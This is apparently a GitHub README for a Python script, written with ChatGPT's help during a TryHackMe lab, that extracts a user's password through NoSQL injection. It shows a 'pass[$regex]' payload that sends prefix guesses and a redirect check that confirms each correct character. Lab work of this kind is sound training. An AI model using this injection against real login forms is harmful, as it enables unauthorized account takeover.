# no-sql-password-bruteforce
With the help of chatgpt, I made a script that bruteforces the password of a no sql application while doing a THM lab (https://tryhackme.com/room/nosqlinjectiontutorial)

![image](https://github.com/user-attachments/assets/f0101684-605d-4185-b2b7-0c58191c93e6)

After running the script

![image](https://github.com/user-attachments/assets/5d6b0b3e-ce42-44e3-9eb2-caf134330193)

# What to do first

*First, fill the headers and data such that it is the same as your HTTP request.*

Example: 
```
headers = {
    "Host": "10.10.123.171",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.123.171",
    "Connection": "keep-alive",
    "Referer": "http://10.10.123.171/",
    "Cookie": "PHPSESSID=2j8v8s9atem0ks7a6gtpmmedgk",
    "Upgrade-Insecure-Requests": "1"
}

def try_password_regex(prefix):
    data = {
        "user": "pedro",
        "pass[$regex]": f"^{prefix}.*$",
        "remember": "on"
    }
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    return response
 ```
 
*Second, don't forget to change the max number of characters (for me it was 4 characters for the user pedro)*

*Lastly, change the location header that it will redirect you to if the password fails.*

```
 if response.status_code == 302 and location_header != "/?err=1":
                password += char
                print(f"[+] Found character {i+1}: {char} => {password}")
                break
```
I was redirected to `/?err=1` if the character was wrong.

# How to run?

just use `python3 nosqlbruteforce.py`

Good Luck!
